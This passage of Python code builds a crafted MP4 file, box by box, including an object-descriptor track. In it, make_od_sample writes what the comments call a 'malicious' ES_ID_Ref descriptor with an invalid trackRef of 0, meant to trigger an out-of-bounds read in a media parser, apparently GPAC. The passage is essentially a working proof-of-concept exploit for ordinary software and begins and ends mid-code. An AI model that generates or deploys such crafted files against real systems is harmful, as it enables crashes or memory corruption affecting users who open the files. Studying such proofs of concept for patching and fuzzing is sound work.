\n    nmhd = write_box(b\'nmhd\', nmhd_data)\n    \n    data = nmhd\n    data += make_dinf()\n    data += make_stbl_od(sample_size, mdat_offset)\n    return write_box(b\'minf\', data)\n\ndef make_tref_mpod(track_ids):\n    """Create tref box with mpod reference"""\n    # mpod box contains track IDs\n    mpod_data = b\'\'\n    for tid in track_ids:\n        mpod_data += struct.pack(\'>I\', tid)\n    mpod_box = write_box(b\'mpod\', mpod_data)\n    \n    return write_box(b\'tref\', mpod_box)\n\ndef make_mdia_od(sample_size, mdat_offset):\n    """Create mdia box for OD track"""\n    data = make_mdhd()\n    data += make_hdlr(b\'odsm\', \'ObjectDescriptorHandler\')\n    data += make_minf_od(sample_size, mdat_offset)\n    return write_box(b\'mdia\', data)\n\ndef make_od_sample():\n    """Create malicious OD sample with ES_ID_Ref containing invalid trackRef"""\n    # OD Update command tag=0x01\n    od_update = b\'\'\n    \n    # ISOM OD descriptor tag=0x0F (GF_ODF_ISOM_OD_TAG)\n    isom_od = b\'\'\n    isom_od += struct.pack(\'>H\', 1)  # objectDescriptorID\n    isom_od += struct.pack(\'>H\', 0)  # URLLength = 0\n    \n    # ES_ID_Ref descriptor tag=0x0E (GF_ODF_ESD_REF_TAG)\n    # This is the malicious part - trackRef = 0 will cause OOB read\n    es_id_ref = struct.pack(\'>H\', 0)  # trackRef = 0 (INVALID!)\n    es_id_ref_desc = struct.pack(\'>B\', 0x0E) + encode_desc_size(len(es_id_ref)) + es_id_ref\n    \n    isom_od += es_id_ref_desc\n    isom_od_desc = struct.pack(\'>B\', 0x0F) + encode_desc_size(len(isom_od)) + isom_od\n    \n    od_update += isom_od_desc\n    od_update_cmd = struct.pack(\'>B\', 0x01) + encode_desc_size(len(od_update)) + od_update\n    \n    return od_update_cmd\n\ndef make_trak_od(track_id, sample_size, mdat_offset):\n    """Create OD track"""\n    data = make_tkhd(track_id)\n    data += make_tref_mpod([1])  # Reference to track 1 (but we\'ll use invalid trackRef)\n    data += make_mdia_od(sample_size, mdat_offset)\n    return write_box(b\'trak\', da